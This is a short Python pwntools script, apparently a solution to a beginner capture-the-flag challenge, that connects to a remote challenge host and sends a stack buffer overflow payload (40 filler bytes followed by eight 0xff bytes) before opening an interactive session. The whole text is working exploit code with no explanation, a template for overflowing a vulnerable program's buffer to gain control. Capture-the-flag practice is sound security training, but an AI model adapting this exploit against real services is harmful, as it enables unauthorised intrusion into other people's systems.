from pwn import *

DEBUG = False

if DEBUG:
    r = process("./beginner-generic-pwn-number-0")
    gdb.attach(r)
else:
    r = remote("mc.ax",31199)

print(r.recvuntil("? :("))

payload = "a"*40 + "\xff\xff\xff\xff\xff\xff\xff\xff"
r.sendline(payload)

r.interactive()